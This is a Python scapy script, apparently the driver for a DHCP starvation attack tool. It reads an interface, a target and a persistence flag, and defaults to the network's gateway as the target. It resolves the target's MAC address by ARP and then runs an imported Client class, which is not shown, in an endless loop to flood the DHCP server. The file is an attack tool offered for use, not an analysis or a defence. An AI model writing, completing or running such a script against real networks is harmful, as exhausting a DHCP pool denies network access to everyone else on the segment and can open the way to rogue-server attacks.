import argparse
import threading

from scapy.config import conf
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp1, sr1, sendp, sniff
from scapy.utils import mac2str
from random import randint

from Client import Client

# Create the parser
parser = argparse.ArgumentParser(prog='DHCPStarvationNEW.py', description='DHCP Starvation')

# Add the arguments
parser.add_argument('-p', '--persistent', action='store_true', help='persistent?')
parser.add_argument('-i', '--iface', metavar='IFACE', action='store', type=str, help='Interface you wish to use')
parser.add_argument('-t', '--target', metavar='TARGET', action='store', type=str, help='IP of target server')

args = parser.parse_args()
mac_addr = mac2str(Ether().src)


def get_mac(ip_addr):
    """
    It sends an ARP request to the IP address you specify, and returns the MAC address of the device that responds

    :param ip_addr: The IP address of the target machine
    :return: The MAC address of the IP address.
    """
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_addr, op=1)
    ans = srp1(packet, verbose=0)
    return ans[Ether].src


def main():
    # if no interface is specified, use the default interface
    Client.iface = args.iface if args.iface else conf.iface

    # if no target is specified, use the default gateway
    Client.target = args.target if args.target else conf.route.route("0.0.0.0")[2]

    Client.mac_dst = get_mac(Client.target)

    Client.lock = threading.Lock()
    # if args.persistent:

    while True:
        Client.lock.acquire()
        Client().run()
        Client.lock.release()


if __name__ == '__main__':
    # exit()
    main()
